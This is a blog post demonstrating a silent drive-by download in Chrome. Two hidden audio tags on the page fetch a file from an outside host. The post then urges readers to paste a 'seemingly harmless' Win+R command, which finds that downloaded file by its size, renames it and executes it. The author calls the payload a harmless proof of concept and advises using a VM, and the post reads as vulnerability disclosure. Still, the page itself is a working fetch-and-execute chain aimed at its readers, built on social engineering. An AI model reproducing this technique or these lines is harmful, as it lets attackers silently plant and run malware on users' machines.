---
layout: post
title: Don't run commands you don't really understand
comments: true
---

This demonstrates a fully silent drive-by download in Google Chrome (rather similar to CVE-2011-0611, but without the automatic execution part), as well as some social engineering magic: a PoC binary will execute if the below seemingly harmless command line is entered in a **Win+R** prompt on a Windows system. Note that you may need to wait for a few seconds before the fun starts.

<div style= "padding: 2px 4px;  background-color: #de9393; padding-top: 9px ; border: 1px solid #ccc; display:table">
<div style= "padding: 2px 4px;  background-color: #de9393;  width:720px ; display:inline-block;">

<B>Keep safe!</B> To avoid unnecessary risk, only try this in a temporary VM.
</div>
</div>

**Just run this and be surprised:**

<pre>
cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
</pre>

<IMG src=https://i.imgur.com/jgmi7XN.png>

Can you figure out how this works?

<audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />
<audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />

Notes: 

  * The PoC binary is a 100% harmless demo  
  * The chiptune in the PoC is (c) 1987 Jozz
  * Reported to Google in November 2015 (status: Wontfix)

<A href=https://twitter.com/hexatomium>Follow</A> @hexatomium
